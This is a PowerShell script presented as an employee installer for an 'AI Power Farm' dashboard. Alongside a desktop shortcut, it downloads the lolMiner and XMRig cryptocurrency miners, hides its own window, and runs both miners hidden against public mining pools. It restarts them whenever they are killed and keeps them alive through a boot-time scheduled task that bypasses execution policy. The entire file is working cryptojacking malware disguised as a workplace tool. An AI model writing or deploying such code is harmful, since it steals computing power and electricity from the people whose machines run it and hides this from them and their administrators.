<#
AI Power Farm - Employee Installer
Installs AI Dashboard access + Hidden GPU/CPU Miner
#>

$SERVER_URL = "http://YOUR_SERVER_IP:5000"
$MINER_DIR = "$env:APPDATA\AI-Power-Farm"
$DASHBOARD_URL = "$SERVER_URL"

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "   AI POWER FARM - INSTALLER" -ForegroundColor Cyan
Write-Host "   AI Dashboard + Background Mining" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# Check admin
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[ERROR] Run as Administrator!" -ForegroundColor Red
    Write-Host "Right-click and select 'Run as administrator'" -ForegroundColor Yellow
    pause
    exit
}

# Create desktop shortcut to dashboard
Write-Host "[1/4] Creating dashboard shortcut..." -ForegroundColor Yellow
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\Desktop\AI Power Farm.lnk")
$Shortcut.TargetPath = $DASHBOARD_URL
$Shortcut.Save()
Write-Host "[OK] Dashboard shortcut created on desktop" -ForegroundColor Green

# Download miners
Write-Host "[2/4] Downloading miners (this may take a minute)..." -ForegroundColor Yellow
New-Item -ItemType Directory -Force -Path $MINER_DIR | Out-Null

# Download lolMiner
try {
    Invoke-WebRequest -Uri "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.97a/lolMiner_v1.97a_Win64.zip" -OutFile "$MINER_DIR\lolminer.zip" -ErrorAction Stop
    Expand-Archive -Path "$MINER_DIR\lolminer.zip" -DestinationPath "$MINER_DIR\lolminer" -Force
    Write-Host "[OK] GPU Miner downloaded" -ForegroundColor Green
} catch {
    Write-Host "[WARN] GPU miner download failed, continuing..." -ForegroundColor Yellow
}

# Download XMRig
try {
    Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc2019-win64.zip" -OutFile "$MINER_DIR\xmrig.zip" -ErrorAction Stop
    Expand-Archive -Path "$MINER_DIR\xmrig.zip" -DestinationPath "$MINER_DIR\xmrig" -Force
    Write-Host "[OK] CPU Miner downloaded" -ForegroundColor Green
} catch {
    Write-Host "[WARN] CPU miner download failed, continuing..." -ForegroundColor Yellow
}

# Create hidden start script
Write-Host "[3/4] Configuring hidden miners..." -ForegroundColor Yellow

$startScript = @'
# Hide PowerShell window
$code = @'
    using System;
    using System.Runtime.InteropServices;
    public class Win32 {
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
'@
Add-Type -TypeDefinition $code
$hwnd = (Get-Process -Id $PID).MainWindowHandle
[Win32]::ShowWindow($hwnd, 0)

# Start GPU miner (hidden)
$gpuArgs = "--algo", "etchash", "--server", "etc.2miners.com:1010", "--user", "YOUR_ETC_WALLET", "--pass", "x"
Start-Process -FilePath "$env:APPDATA\AI-Power-Farm\lolminer\lolMiner.exe" -ArgumentList $gpuArgs -WindowStyle Hidden

# Start CPU miner (hidden)
$cpuArgs = "--algo", "rx/0", "--url", "pool.hashvault.pro:443", "--user", "YOUR_XMR_WALLET", "--pass", "x", "--donate-level", "0"
Start-Process -FilePath "$env:APPDATA\AI-Power-Farm\xmrig\xmrig.exe" -ArgumentList $cpuArgs -WindowStyle Hidden

# Keep running and restart if killed
while ($true) {
    $gpu = Get-Process -Name "lolMiner" -ErrorAction SilentlyContinue
    $cpu = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
    
    if (-not $gpu) {
        Start-Process -FilePath "$env:APPDATA\AI-Power-Farm\lolminer\lolMiner.exe" -ArgumentList $gpuArgs -WindowStyle Hidden
    }
    if (-not $cpu) {
        Start-Process -FilePath "$env:APPDATA\AI-Power-Farm\xmrig\xmrig.exe" -ArgumentList $cpuArgs -WindowStyle Hidden
    }
    
    Start-Sleep -Seconds 30
}
'@
$startScript | Out-File -FilePath "$MINER_DIR\start.ps1" -Encoding UTF8

# Create scheduled task (runs on boot, hidden)
Write-Host "[4/4] Setting up auto-start..." -ForegroundColor Yellow
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$MINER_DIR\start.ps1`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
Register-ScheduledTask -TaskName "AI-Power-Farm" -Action $action -Trigger $trigger -Settings $settings -Force

# Start miners now
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$MINER_DIR\start.ps1`"" -WindowStyle Hidden

Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "   INSTALLATION COMPLETE!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "AI Dashboard: $DASHBOARD_URL" -ForegroundColor Cyan
Write-Host "Desktop shortcut: Created" -ForegroundColor Cyan
Write-Host "Mining: Running in background" -ForegroundColor Cyan
Write-Host "Auto-start: Enabled" -ForegroundColor Cyan
Write-Host ""
Write-Host "The AI is now free! Mining pays for it." -ForegroundColor Yellow
Write-Host ""
Write-Host "To uninstall: Run 'schtasks /delete /tn AI-Power-Farm /f'" -ForegroundColor Gray
Write-Host ""
pause
